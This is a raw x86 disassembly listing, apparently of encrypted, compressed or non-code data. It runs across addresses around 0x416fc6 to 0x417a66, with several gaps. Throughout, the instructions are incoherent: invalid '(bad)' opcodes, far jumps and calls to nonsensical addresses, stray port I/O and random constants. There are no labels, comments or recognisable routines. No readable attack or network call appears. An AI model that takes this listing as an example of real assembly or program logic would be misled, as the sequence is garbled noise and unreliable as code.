  416fc6:	jnp    0x416f76
  416fc8:	xor    ecx,ebp
  416fca:	push   ecx
  416fcb:	out    0x4e,eax
  416fcd:	into   
  416fce:	sbb    al,0x1c
  416fd0:	add    eax,0xcd1cfcf8
  416fd5:	dec    edi
  416fd6:	jmp    0x9bcb4e35
  416fdb:	cmp    esi,DWORD PTR [ebp+0x68eeb183]
  416fe1:	daa    
  416fe2:	add    BYTE PTR [edx-0x5a],cl
  416fe5:	ins    DWORD PTR es:[edi],dx
  416fe6:	out    0xe9,eax
  416fe8:	xor    BYTE PTR ds:0xb7dca475,ch
  416fee:	jmp    0x417054
  416ff0:	sub    esp,DWORD PTR [ebx]
  416ff2:	popa   
  416ff3:	jg     0x416fe8
  416ff5:	cmp    DWORD PTR [edi-0x11],0x14d74e01
  416ffc:	mov    eax,ds:0x59a4c18c
  417001:	adc    ecx,ecx
  417003:	cmp    ebp,edx
  417005:	sub    al,0x84
  417007:	mov    al,0x68
  417009:	add    ebp,0xffffffa6
  41700c:	xor    BYTE PTR [ebx],ah
  41700e:	bound  edi,QWORD PTR [edi]
	...
  417074:	jbe    0x4170a3
  417076:	push   ebp
  417077:	inc    ecx
  417078:	pop    edi
  417079:	jns    0x4170f1
  41707b:	aas    
  41707c:	(bad)  
  41707d:	loopne 0x417073
  41707f:	sub    edi,DWORD PTR [ebx]
  417081:	(bad)  
  417082:	mov    ebp,0xf360f9
  417087:	add    BYTE PTR [ecx+eax*1],al
  41708a:	add    BYTE PTR [eax],al
  41708c:	cmp    al,BYTE PTR ds:0x1f12894e
  417092:	mov    cl,0x23
  417094:	fs push ecx
  417096:	push   ecx
  417097:	ret    0x5e52
  41709a:	mov    ecx,0xd37df29f
  41709f:	xchg   esp,eax
  4170a0:	shr    ch,cl
  4170a2:	mov    eax,0x43e802a8
  4170a7:	daa    
  4170a8:	dec    eax
  4170a9:	mov    al,0x0
  4170ab:	test   BYTE PTR [ebx],al
  4170ad:	retf   0x7107
  4170b0:	gs add al,0x48
  4170b3:	(bad)  
  4170b4:	xchg   ebx,eax
  4170b5:	dec    ecx
  4170b6:	adc    esp,DWORD PTR [ecx-0x25]
  4170b9:	add    al,0x4c
  4170bb:	pop    eax
  4170bc:	sub    ecx,0xffffffcf
  4170bf:	aad    0x14
  4170c1:	push   esi
  4170c2:	clc    
  4170c3:	push   eax
  4170c4:	jb     0x417110
  4170c6:	gs dec esp
  4170c8:	jmp    DWORD PTR [eax+0x5f]
  4170cb:	repnz dec edx
  4170cd:	ins    DWORD PTR es:[edi],dx
  4170ce:	dec    ebx
  4170cf:	mov    esi,0x62f6f0d
  4170d4:	xor    al,0xba
  4170d6:	scas   al,BYTE PTR es:[edi]
  4170d7:	sub    ah,BYTE PTR [ecx]
  4170d9:	inc    esp
  4170da:	mov    esp,ecx
  4170dc:	push   cs
  4170dd:	test   al,0x91
  4170df:	inc    eax
  4170e0:	or     BYTE PTR [ecx+0x3c],0xdc
  4170e4:	adc    BYTE PTR [ebp+0x759e56cf],0xc8
  4170eb:	js     0x41706d
  4170ed:	retf   0x2e92
  4170f0:	adc    al,0xab
  4170f2:	mov    ds,edi
  4170f4:	adc    edi,DWORD PTR [edi]
  4170f6:	lods   al,BYTE PTR ds:[esi]
  4170f7:	mov    ch,0x9f
  4170f9:	test   al,0x46
  4170fb:	fld    TBYTE PTR [esi+0x27]
  4170fe:	inc    edi
  4170ff:	add    eax,0x8dba5d7c
  417104:	call   0xbe9466b4
  417109:	out    0xde,al
  41710b:	add    DWORD PTR [ecx],esi
  41710d:	xchg   edx,eax
  41710e:	mov    dh,0x40
  417110:	stos   DWORD PTR es:[edi],eax
  417111:	dec    ebx
  417112:	dec    edi
  417113:	not    dl
  417115:	test   eax,0xcc8b4601
  41711a:	jb     0x4170ee
  41711c:	push   esp
  41711d:	push   es
  41711e:	daa    
  41711f:	push   0xfcd34445
  417124:	push   edx
  417125:	addr16 dec esi
  417127:	popf   
  417128:	pop    esi
  417129:	xor    DWORD PTR [ebx+0x308fd4a1],ebp
  41712f:	ja     0x417139
  417131:	fcom   QWORD PTR [esi]
  417133:	loopne 0x41718e
  417135:	ret    
  417136:	mov    eax,ds:0xa818e77c
  41713b:	cdq    
  41713c:	fsub   QWORD PTR [edx+eiz*4]
  41713f:	and    DWORD PTR [edi],esp
  417141:	sahf   
  417142:	mov    WORD PTR [esi],?
  417144:	test   BYTE PTR [ebp+0x361386db],dh
  41714a:	bound  edi,QWORD PTR [ebx-0x5dfdda3e]
  417150:	es in  eax,0xaf
  417153:	and    bl,BYTE PTR [ecx+eiz*4+0x29]
  417157:	retf   
  417158:	push   ds
  417159:	gs jl  0x4170ef
  41715c:	pusha  
  41715d:	lock outs dx,BYTE PTR ds:[esi]
  41715f:	mov    dl,0xc4
  417161:	dec    edi
  417162:	(bad)  
  417163:	cmp    al,0x92
  417165:	out    dx,ax
  417167:	fdivr  DWORD PTR [esi-0x72d101c9]
  41716d:	xchg   BYTE PTR [eax-0x50bad8ee],ah
  417173:	aam    0xee
  417175:	push   ebp
  417176:	bound  ebp,QWORD PTR [edi-0x17730b3a]
  41717c:	in     al,0x7a
  41717e:	ror    ecx,1
  417180:	lock xchg esp,eax
  417182:	mov    bl,0xfa
  417184:	xchg   edx,eax
  417185:	shl    BYTE PTR [esi-0x3fdadb77],0x31
  41718c:	jb     0x41720a
  41718e:	retf   0xff
	...
  4171f1:	add    BYTE PTR [eax],al
  4171f3:	add    BYTE PTR [esi-0xe58fe7],ah
  4171f9:	jnp    0x4171e9
  4171fb:	mov    ebp,0x986526a4
  417200:	sbb    edx,DWORD PTR [eax+0x11]
  417203:	in     eax,0x64
  417205:	hlt    
  417206:	add    BYTE PTR [eax],al
  417208:	add    al,0x1
  41720a:	add    BYTE PTR [eax],al
  41720c:	inc    ebp
  41720d:	(bad)  
  41720e:	or     al,0xe
  417210:	inc    ebx
  417211:	repnz shl DWORD PTR ds:0x5604491,0xf9
  417219:	mov    esi,0x282d210f
  41721e:	rcr    cl,cl
  417220:	test   DWORD PTR [ebp+ecx*1-0x48094a91],eax
  417227:	data16 fistp WORD PTR [esi-0x41f8f60c]
  41722e:	xchg   edx,eax
  41722f:	xlat   BYTE PTR ds:[ebx]
  417230:	pop    ebp
  417231:	jno    0x4171d5
  417233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417234:	ds pop ebx
  417236:	inc    esp
  417237:	dec    esi
  417238:	mov    esi,0x63f3e4c4
  41723d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41723e:	push   ebx
  41723f:	jmp    0xb056:0xf43ed98
  417246:	mov    eax,ds:0x3e067b25
  41724b:	push   0x59a0d37d
  417250:	test   cl,0xe3
  417253:	jl     0x4171d6
  417255:	imul   edx,DWORD PTR [edx],0x39c093e2
  41725b:	sbb    DWORD PTR [ecx+0x36],ebp
  41725e:	add    BYTE PTR [ecx],bl
  417260:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417261:	mov    ecx,0x4e1e9559
  417266:	(bad)  
  417268:	mov    edi,0xa30be6b9
  41726d:	fist   DWORD PTR [esi+0x435931c8]
  417273:	outs   dx,BYTE PTR ds:[esi]
  417274:	les    ebp,FWORD PTR [ebp+0x65]
  417277:	sbb    dl,BYTE PTR [edi+edx*2-0x24]
  41727b:	inc    ebp
  41727c:	push   edx
  41727d:	inc    ebp
  41727e:	test   eax,0xb7999dff
  417283:	mov    ebx,0xad54ceae
  417288:	inc    ecx
  417289:	aad    0x6c
  41728b:	cmp    ch,cl
  41728d:	fadd   st(6),st
  41728f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417290:	and    eax,0xa3ae724a
  417295:	or     DWORD PTR [edi],esp
  417297:	gs jo  0x4172d1
  41729a:	dec    ecx
  41729b:	xchg   DWORD PTR [esi+edx*8-0x620658e9],edx
  4172a2:	dec    eax
  4172a3:	fdiv   QWORD PTR [esi]
  4172a5:	mov    es,WORD PTR [esi+ebp*2]
  4172a8:	cmc    
  4172a9:	lds    ebp,FWORD PTR [esi-0x54]
  4172ac:	dec    esi
  4172ad:	and    eax,0xd80b2e35
  4172b2:	popa   
  4172b3:	enter  0x7d51,0x9
  4172b7:	fdiv   QWORD PTR [esi]
  4172b9:	jg     0x41729c
  4172bb:	inc    eax
  4172bc:	cwd    
  4172be:	inc    ebp
  4172bf:	dec    ecx
  4172c0:	fcom   QWORD PTR [ecx+eax*2+0x752c96e5]
  4172c7:	idiv   DWORD PTR [ebp-0x213578e3]
  4172cd:	inc    ebp
  4172ce:	(bad)  
  4172cf:	stc    
  4172d0:	cmp    edx,DWORD PTR [edi]
  4172d2:	test   edi,edx
  4172d4:	or     eax,0xdbcaeb8e
  4172d9:	mov    ebx,DWORD PTR [esi-0x48]
  4172dc:	push   ss
  4172dd:	mov    eax,0x8124b33b
  4172e2:	test   al,0xcc
  4172e4:	inc    esi
  4172e5:	sbb    bh,dl
  4172e7:	out    0x32,al
  4172e9:	and    BYTE PTR [edi],bl
  4172eb:	rcr    DWORD PTR [ebx+ebx*2],0xfd
  4172ef:	(bad)  
  4172f0:	ins    DWORD PTR es:[edi],dx
  4172f1:	retf   
  4172f2:	mov    cl,0x4
  4172f4:	nop
  4172f5:	pop    es
  4172f6:	or     eax,0x4369d027
  4172fb:	out    dx,al
  4172fc:	and    ebx,eax
  4172fe:	fild   QWORD PTR [eax+0x4]
  417301:	jno    0x4172e5
  417303:	fsubr  DWORD PTR [ebp-0x603e4837]
  417309:	pop    ebp
  41730a:	mov    DWORD PTR [edi],ebx
  41730c:	ror    BYTE PTR [edi],1
  41730e:	inc    eax
  41730f:	add    BYTE PTR gs:[eax],al
	...
  417372:	add    BYTE PTR [eax],al
  417374:	imul   edi,DWORD PTR [edi+edx*8-0x168028a2],0x8016bbf
  41737f:	shr    BYTE PTR gs:[edx+0x26],0x2b
  417384:	push   0x40000f5
  417389:	add    DWORD PTR [eax],eax
  41738b:	add    BYTE PTR [edi],al
  41738d:	push   es
  41738e:	pop    esi
  41738f:	fwait
  417390:	adc    al,0x4b
  417392:	jl     0x417409
  417394:	mov    esp,0x52155196
  417399:	into   
  41739a:	push   esp
  41739b:	(bad)  
  41739c:	shl    BYTE PTR [ecx+0x7c65b6da],0x49
  4173a3:	iret   
  4173a4:	addr16 call 0xd738:0xa46dadb5
  4173ac:	dec    esp
  4173ad:	or     bl,BYTE PTR [eax-0x659ea729]
  4173b3:	mov    edx,0x143c63a4
  4173b8:	lods   eax,DWORD PTR cs:[esi]
  4173ba:	cmp    al,0xb
  4173bc:	fsubr  DWORD PTR [ebx+0x368245cb]
  4173c2:	leave  
  4173c3:	dec    ebx
  4173c4:	inc    ebx
  4173c5:	lea    ebx,[ebp-0x19]
  4173c8:	cmp    al,0xd5
  4173ca:	push   esp
  4173cb:	es dec edx
  4173cd:	mov    eax,ds:0x437c1508
  4173d2:	cmp    eax,0xf191df84
  4173d7:	mov    ebx,0x26414050
  4173dc:	aas    
  4173dd:	adc    al,0xe9
  4173df:	cmp    eax,0x84a83259
  4173e4:	ret    0x1a52
  4173e7:	lahf   
  4173e8:	idiv   BYTE PTR [edi]
  4173ea:	mov    ecx,DWORD PTR [esi]
  4173ec:	scas   eax,DWORD PTR es:[edi]
  4173ed:	in     al,dx
  4173ee:	in     eax,dx
  4173ef:	pop    es
  4173f0:	pusha  
  4173f1:	ds dec ecx
  4173f3:	add    esp,DWORD PTR [edi-0x43]
  4173f6:	pop    eax
  4173f7:	xchg   esp,eax
  4173f8:	pop    ebp
  4173f9:	sub    DWORD PTR [esi-0x6a],ebx
  4173fc:	cmp    DWORD PTR [ecx-0x80],0x62
  417400:	jmp    0x2e50a5dc
  417405:	jno    0x4173c7
  417407:	or     esi,DWORD PTR ss:[edi+0x5c]
  41740b:	mov    ds:0x40e336e7,eax
  417410:	gs (bad) 
  417412:	cmc    
  417413:	pop    ebp
  417414:	nop
  417415:	and    eax,0xf441ecf1
  41741a:	add    ecx,DWORD PTR [ebx+0x630b0eab]
  417420:	inc    edi
  417421:	mov    WORD PTR [ecx-0x18],es
  417424:	jo     0x4173a7
  417426:	mov    dl,0x32
  417428:	dec    ebx
  417429:	jge    0x417442
  41742b:	adc    DWORD PTR [ecx+0x60a197e8],esp
  417431:	pop    ss
  417432:	pop    esi
  417433:	fs dec edi
  417435:	out    0x3a,al
  417437:	jp     0x417439
  417439:	sar    BYTE PTR [ebx+0x65fd0d5c],cl
  41743f:	pop    esi
  417440:	mov    ah,0x28
  417442:	mov    dl,0x2b
  417444:	xor    DWORD PTR [esp+eax*1+0x35],0xffffffa2
  417449:	xor    BYTE PTR [ecx-0x300135b4],al
  41744f:	xchg   edi,eax
  417450:	pop    ebp
  417451:	push   ecx
  417452:	or     al,0x99
  417454:	fwait
  417455:	push   es
  417456:	gs push cs
  417458:	sub    BYTE PTR [ecx],0xcd
  41745b:	mov    BYTE PTR [esp+ebx*4-0x14],0x70
  417460:	add    eax,0xe139286b
  417465:	sbb    DWORD PTR [esi+0x66],esp
  417468:	jae    0x417476
  41746a:	push   ebp
  41746b:	add    BYTE PTR [ebx],bh
  41746d:	pop    ds
  41746e:	in     al,0xfa
  417470:	and    DWORD PTR ds:0x7b1da599,ebx
  417476:	push   edi
  417477:	daa    
  417478:	fisubr DWORD PTR [edx-0x19081e9a]
  41747e:	inc    eax
  41747f:	jno    0x41743a
  417481:	in     al,0x5d
  417483:	jg     0x4174cb
  417485:	xchg   ebx,eax
  417486:	adc    bl,BYTE PTR [eax+eiz*2+0x4c]
  41748a:	sbb    DWORD PTR [edx],ebx
  41748c:	in     al,dx
  41748d:	dec    ebp
  41748e:	sahf   
  41748f:	xchg   esi,eax
	...
  4174f4:	xchg   ecx,eax
  4174f5:	mov    edx,0xdc6b0c6a
  4174fa:	idiv   DWORD PTR [edi+0x212a686b]
  417500:	imul   edi,DWORD PTR [ecx-0x993f2d5],0x1040000
  41750a:	add    BYTE PTR [eax],al
  41750c:	int3   
  41750d:	mov    edi,0xaedb6351
  417512:	add    dh,BYTE PTR [ebx+eiz*8-0x32]
  417516:	stos   BYTE PTR es:[edi],al
  417517:	xchg   DWORD PTR [edi],esp
  417519:	mov    al,ds:0x8c4b16ca
  41751e:	pop    es
  41751f:	sub    al,0x40
  417521:	int    0xdb
  417523:	test   eax,0xb9cc75d4
  417528:	xchg   BYTE PTR [ebx+edx*1],bh
  41752b:	aad    0xb1
  41752d:	cmp    BYTE PTR [esi+0x2eb98157],cl
  417533:	out    dx,eax
  417534:	sbb    al,0x57
  417536:	popf   
  417537:	jmp    WORD PTR [eax+0x6ce6622c]
  41753e:	xor    edx,DWORD PTR ds:0xff0e3538
  417544:	in     eax,0x57
  417546:	jae    0x417539
  417548:	hlt    
  417549:	shl    BYTE PTR [edi-0x5e],1
  41754c:	or     edx,DWORD PTR [ebp-0x50]
  41754f:	setne  BYTE PTR [ebx]
  417552:	adc    eax,0x3917ceb6
  417557:	mov    esi,0x43b4cbd3
  41755c:	iret   
  41755d:	mov    ch,0x57
  41755f:	cmp    eax,0x532280a6
  417564:	inc    ebx
  417565:	mov    ds:0x3a8c3a52,eax
  41756a:	(bad)  
  41756c:	and    edi,DWORD PTR [edx]
  41756e:	pop    esi
  41756f:	sahf   
  417570:	sub    DWORD PTR [edx-0x57],edx
  417573:	inc    ebx
  417574:	push   eax
  417575:	jle    0x417558
  417577:	cli    
  417578:	cmp    DWORD PTR [ebp-0x73],0x8ac12cb3
  41757f:	ins    BYTE PTR es:[edi],dx
  417580:	dec    ecx
  417581:	lahf   
  417582:	shr    esi,1
  417584:	sub    al,0x12
  417586:	cdq    
  417587:	mov    ss,WORD PTR [ebx-0x67cd953e]
  41758d:	mov    al,0x9d
  41758f:	out    dx,eax
  417590:	sbb    DWORD PTR [ebp-0x1662ac41],edx
  417596:	inc    ebx
  417597:	inc    edx
  417598:	mov    cl,0x96
  41759a:	add    al,0x3f
  41759c:	rcr    BYTE PTR [esi+ebp*1-0x156ca0f],cl
  4175a3:	add    BYTE PTR [edx],0x42
  4175a6:	dec    ebx
  4175a7:	test   DWORD PTR [ecx],ecx
  4175a9:	rcr    BYTE PTR [esi+0x1a],1
  4175ac:	ins    BYTE PTR es:[edi],dx
  4175ad:	fld    QWORD PTR [ecx+ebx*2+0x16]
  4175b1:	cdq    
  4175b2:	xlat   BYTE PTR ds:[ebx]
  4175b3:	jge    0x41756b
  4175b5:	push   0xffffff9a
  4175b7:	jbe    0x4175fb
  4175b9:	les    ebx,FWORD PTR [eax]
  4175bb:	test   BYTE PTR [edi+0x38],dh
  4175be:	xlat   BYTE PTR ds:[ebx]
  4175bf:	popa   
  4175c0:	retf   
  4175c1:	icebp  
  4175c2:	rcr    DWORD PTR [ebp-0x58a4ac54],0xce
  4175c9:	out    dx,al
  4175ca:	xchg   edi,eax
  4175cb:	mov    ebx,DWORD PTR [ebp-0xfe7a971]
  4175d1:	in     al,0x55
  4175d3:	xor    edi,esi
  4175d5:	call   0x607f:0xd8539e7f
  4175dc:	cmp    esp,ebp
  4175de:	cli    
  4175df:	jne    0x4175a1
  4175e1:	push   es
  4175e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175e3:	xchg   BYTE PTR [ecx-0xe],dl
  4175e6:	and    eax,0x77fad605
  4175eb:	call   0x847a:0x7d3fa290
  4175f2:	dec    edi
  4175f3:	test   eax,0xff40ed87
  4175f8:	push   ebp
  4175f9:	jo     0x41766a
  4175fb:	dec    esp
  4175fc:	(bad)  
  4175fd:	lods   al,BYTE PTR ds:[esi]
  4175fe:	hlt    
  4175ff:	cs inc eax
  417601:	mov    gs,WORD PTR [ebx+esi*8]
  417604:	xchg   ebp,eax
  417605:	dec    esi
  417606:	mov    ebx,0xbaf60076
  41760b:	xor    al,0xbe
  41760d:	mov    bh,0x31
  41760f:	inc    esp
	...
  417674:	test   eax,0xdf4fd367
  417679:	(bad)  
  41767a:	mov    ebp,0x411f24e7
  41767f:	ficomp DWORD PTR [eax+0x23]
  417682:	daa    
  417683:	sub    esi,DWORD PTR [eax-0x9]
  417686:	add    BYTE PTR [eax],al
  417688:	add    al,0x1
  41768a:	add    BYTE PTR [eax],al
  41768c:	adc    al,0xa3
  41768e:	xchg   edx,eax
  41768f:	and    al,BYTE PTR [edx*8-0x394ea90f]
  417696:	add    eax,0x26806a66
  41769b:	pop    es
  41769c:	shr    bl,1
  41769e:	out    0xfa,eax
  4176a0:	or     al,0x89
  4176a2:	pxor   mm4,QWORD PTR [ebx+0x38]
  4176a6:	push   esi
  4176a7:	mov    eax,0xdc331225
  4176ac:	push   esi
  4176ad:	push   ds
  4176ae:	or     dl,dl
  4176b0:	lea    edi,[edx+0x11]
  4176b3:	lock inc ebp
  4176b5:	and    bl,al
  4176b7:	mov    eax,ds:0x757bc021
  4176bc:	or     eax,0x7b11618c
  4176c1:	test   BYTE PTR [esi],bh
  4176c3:	pop    ecx
  4176c4:	xor    DWORD PTR fs:[ebx+ebp*2-0xa],ebp
  4176c9:	loop   0x417695
  4176cb:	popa   
  4176cc:	dec    esi
  4176cd:	fidivr DWORD PTR [eax-0x74]
  4176d0:	add    eax,0x6bc0b180
  4176d5:	hlt    
  4176d6:	cmp    eax,0x26c51f24
  4176db:	xchg   ecx,eax
  4176dc:	inc    ecx
  4176dd:	mov    edi,0x77569425
  4176e2:	in     al,0x41
  4176e4:	pop    edi
  4176e5:	xchg   ecx,eax
  4176e6:	retf   0xebee
  4176e9:	ret    0xc169
  4176ec:	mov    esi,0xfeec062
  4176f1:	(bad)  
  4176f2:	cwde   
  4176f3:	ds imul esp,DWORD PTR es:[edi-0x495369cf],0xffffffbf
  4176fc:	popf   
  4176fd:	stc    
  4176fe:	mov    esp,0x491f7c2e
  417703:	xlat   BYTE PTR ds:[ebx]
  417704:	cld    
  417705:	pop    esp
  417706:	mov    eax,ds:0xd521074f
  41770b:	pop    ebx
  41770c:	push   cs
  41770d:	pusha  
  41770e:	mov    al,ds:0x236c48c4
  417713:	dec    edx
  417714:	ret    0x9b30
  417717:	clc    
  417718:	popa   
  417719:	push   DWORD PTR [esi-0x5d]
  41771c:	loope  0x4176cf
  41771e:	xchg   edi,eax
  41771f:	out    0xa0,al
  417721:	push   edi
  417722:	mov    ecx,0x98a8531
  417727:	rcl    DWORD PTR [edx+0x20871a16],0xff
  41772e:	or     DWORD PTR [esi+0x7b],eax
  417731:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417732:	idiv   BYTE PTR [ebx+0xb]
  417735:	sahf   
  417736:	rol    DWORD PTR [ebp+0xf],0x6b
  41773a:	or     dl,BYTE PTR [ebp+0x72e54ce]
  417740:	(bad)  
  417741:	fnstsw WORD PTR [ecx-0x65]
  417744:	cmp    BYTE PTR [eax+0x5d29a2c9],0x5f
  41774b:	ja     0x41778d
  41774d:	mov    dl,0x18
  41774f:	push   ebx
  417750:	push   ss
  417751:	mov    bh,BYTE PTR [ecx+0x51dcf0a3]
  417757:	stos   BYTE PTR es:[edi],al
  417758:	leave  
  417759:	xor    DWORD PTR [ecx+0x7b],esp
  41775c:	inc    esi
  41775d:	scas   eax,DWORD PTR es:[edi]
  41775e:	push   ecx
  41775f:	(bad)  
  417760:	repnz mov al,0x28
  417763:	lea    eax,[edx]
  417765:	data16 aad 0x6a
  417768:	hlt    
  417769:	shl    DWORD PTR [ebp-0x22410fe4],cl
  41776f:	and    DWORD PTR [ebx+0x62c44a2b],0x5f183109
  417779:	mov    edx,ebx
  41777b:	xchg   edi,eax
  41777c:	adc    dh,ch
  41777e:	lods   al,BYTE PTR ds:[esi]
  41777f:	and    eax,0xc3859e16
  417784:	sbb    BYTE PTR [ebx-0x134a086e],0xec
  41778b:	push   ebp
  41778c:	bnd addr16 data16 jo 0x417791
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	shl    BYTE PTR [edx+0x74550217],cl
  417805:	clc    
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	sub    ecx,DWORD PTR [ecx-0x51b596eb]
  417812:	push   edx
  417813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417814:	sub    BYTE PTR [ecx+0x35bb8c3a],dl
  41781a:	or     esi,esi
  41781c:	mul    cl
  41781e:	mov    ah,BYTE PTR [ecx-0x9]
  417821:	leave  
  417822:	les    ecx,FWORD PTR [ebp+0x62]
  417825:	ss jae 0x4177b4
  417828:	and    edx,esi
  41782a:	mov    eax,0xdf41251c
  41782f:	popa   
  417830:	lea    ebp,[edi]
  417832:	or     DWORD PTR [ebx],edi
  417834:	mov    eax,DWORD PTR [edi-0x15627a76]
  41783a:	lods   eax,DWORD PTR ds:[esi]
  41783b:	mov    dh,0x6a
  41783d:	call   0x2d70:0x707c8392
  417844:	mov    edi,DWORD PTR [eax-0x7215714d]
  41784a:	dec    edi
  41784b:	(bad)  
  41784c:	cmp    ecx,DWORD PTR [eax+0x50]
  41784f:	ss nop
  417851:	int    0xc9
  417853:	in     eax,dx
  417854:	or     ebx,DWORD PTR [edi-0x43]
  417857:	arpl   ax,bp
  417859:	scas   al,BYTE PTR es:[edi]
  41785a:	inc    eax
  41785b:	nop    esp
  41785e:	in     eax,0x7b
  417860:	shl    DWORD PTR [esi+0x15a9679b],cl
  417866:	in     eax,0x57
  417868:	jmp    0x28e8:0xf75c7cce
  41786f:	fsub   QWORD PTR [eax+0x14]
  417872:	jmp    0x417878
  417874:	mov    eax,ds:0x3059180f
  417879:	enter  0xd4ac,0x73
  41787d:	adc    ah,BYTE PTR [esi]
  41787f:	ins    DWORD PTR es:[edi],dx
  417880:	mov    bl,0xc3
  417882:	out    0xe6,eax
  417884:	ret    
  417885:	stc    
  417886:	retf   0xc0e4
  417889:	sub    BYTE PTR [ecx+0x3fba5e88],bh
  41788f:	pop    edx
  417890:	and    edx,DWORD PTR [esi]
  417892:	pop    es
  417893:	jecxz  0x417845
  417895:	enter  0x24a1,0x68
  417899:	unpcklps xmm5,XMMWORD PTR [esi+ebx*8+0x6bbf4257]
  4178a1:	js     0x417896
  4178a3:	adc    esp,DWORD PTR [ebp+0x7dcf3e01]
  4178a9:	inc    edi
  4178aa:	push   es
  4178ab:	sub    ch,BYTE PTR [ebx+0x29ca79a6]
  4178b1:	nop
  4178b2:	mov    ebp,0x621bacab
  4178b7:	mov    ch,0xb0
  4178b9:	imul   ebp,DWORD PTR ds:0x2a2fd222,0x77390fb6
  4178c3:	lods   eax,DWORD PTR ds:[esi]
  4178c4:	mov    bl,0xd6
  4178c6:	daa    
  4178c7:	lods   eax,DWORD PTR ds:[esi]
  4178c8:	(bad)  
  4178c9:	sub    al,0xa6
  4178cb:	mov    edx,DWORD PTR [esi-0x6f497c6d]
  4178d1:	mov    ebp,DWORD PTR [edx-0x6bf3d61]
  4178d7:	xlat   BYTE PTR ds:[ebx]
  4178d8:	jmp    0x107e429d
  4178dd:	jbe    0x4178c6
  4178df:	les    eax,FWORD PTR [edi+0x2b]
  4178e2:	xchg   ebp,eax
  4178e3:	pop    ecx
  4178e4:	(bad)  
  4178e5:	out    dx,al
  4178e6:	(bad)  
  4178e7:	xchg   ebp,eax
  4178e8:	cwde   
  4178e9:	retf   0x94d4
  4178ec:	imul   esi,DWORD PTR [ebp+0xb],0xc830315a
  4178f3:	pop    es
  4178f4:	loope  0x4178f7
  4178f6:	and    ch,cl
  4178f8:	ins    BYTE PTR es:[edi],dx
  4178f9:	push   ss
  4178fa:	push   ecx
  4178fb:	xor    edi,ecx
  4178fd:	scas   eax,DWORD PTR es:[edi]
  4178fe:	stc    
  4178ff:	pop    ebp
  417900:	fs push eax
  417902:	sub    DWORD PTR [edx-0x2bd9e040],0xffffffdb
  417909:	enter  0x9257,0x64
  41790d:	into   
  41790e:	jecxz  0x417969
	...
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	je     0x41792f
  417982:	(bad)  
  417983:	mov    edx,0xf978
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	stos   BYTE PTR es:[edi],al
  41798d:	and    BYTE PTR [ebp+0x11],bl
  417990:	mov    ah,0x1a
  417992:	xor    al,0xd8
  417994:	mov    edi,DWORD PTR [edi-0x1]
  417997:	mov    edx,0x191a981d
  41799c:	mov    ah,0x55
  41799e:	out    0xdd,al
  4179a0:	stc    
  4179a1:	dec    ebp
  4179a2:	lods   al,BYTE PTR ds:[esi]
  4179a3:	lods   al,BYTE PTR ds:[esi]
  4179a4:	push   esi
  4179a5:	pop    ecx
  4179a6:	jle    0x417978
  4179a8:	mov    ah,0xa0
  4179aa:	xor    al,dh
  4179ac:	mov    ebp,0xdf5f4f49
  4179b1:	dec    edx
  4179b2:	cld    
  4179b3:	in     eax,dx
  4179b4:	pop    ecx
  4179b5:	inc    edx
  4179b6:	dec    edi
  4179b7:	jbe    0x417973
  4179b9:	test   al,0x99
  4179bb:	in     eax,dx
  4179bc:	mov    ds:0xe8da3a3b,al
  4179c1:	sub    DWORD PTR ds:0x930db05,edi
  4179c7:	test   eax,0x9a105a18
  4179cc:	leave  
  4179cd:	sbb    eax,0xe1594a50
  4179d2:	popf   
  4179d3:	xchg   edi,eax
  4179d4:	shl    ch,0xd5
  4179d7:	jp     0x41795d
  4179d9:	mov    edx,0x927e8c51
  4179de:	mov    dh,0xd2
  4179e0:	cmp    al,BYTE PTR [edi+0x87e9f5f]
  4179e6:	fwait
  4179e7:	aad    0x37
  4179e9:	stc    
  4179ea:	repnz or ebp,edx
  4179ed:	pop    ss
  4179ee:	pop    es
  4179ef:	push   cs
  4179f0:	pusha  
  4179f1:	imul   esp,esi,0xffffffec
  4179f4:	inc    eax
  4179f5:	shr    esi,0x6d
  4179f8:	std    
  4179f9:	es (bad) 
  4179fb:	lods   eax,DWORD PTR ds:[esi]
  4179fc:	inc    ebx
  4179fd:	inc    esi
  4179fe:	std    
  4179ff:	adc    bh,dl
  417a01:	icebp  
  417a02:	xor    DWORD PTR [ebp-0x1479b429],edi
  417a08:	xchg   eax,edx
  417a0a:	cli    
  417a0b:	mov    ebp,0x1515a1e1
  417a10:	xchg   ebp,eax
  417a11:	or     eax,0x88d92b69
  417a16:	shl    ebx,1
  417a18:	test   BYTE PTR [ecx+eiz*2+0x7],bl
  417a1c:	cld    
  417a1d:	push   es
  417a1e:	fidiv  WORD PTR [ebp-0x656efa45]
  417a24:	lea    ebp,[esi+0xf88100f]
  417a2a:	xchg   ecx,eax
  417a2b:	int    0x70
  417a2d:	cmp    BYTE PTR [esi],ch
  417a2f:	or     DWORD PTR [eax+0x5a9f89be],ebx
  417a35:	adc    al,0xb0
  417a37:	aas    
  417a38:	push   0xffffff96
  417a3a:	mov    esi,0xd6c3fb13
  417a3f:	ret    0x3cc4
  417a42:	push   ebx
  417a43:	inc    esp
  417a44:	fsubr  st(3),st
  417a46:	push   0xffffffc6
  417a48:	sahf   
  417a49:	das    
  417a4a:	jmp    0xf1d97e6b
  417a4f:	ss pop esp
  417a51:	outs   dx,BYTE PTR ds:[esi]
  417a52:	test   eax,0xb8cbc757
  417a57:	push   esp
  417a58:	adc    eax,0xfce25c34
  417a5d:	inc    ebx
  417a5e:	ja     0x417a78
  417a60:	ret    
  417a61:	and    al,0x78
  417a63:	or     al,ch
  417a65:	daa    
  417a66:	stc    
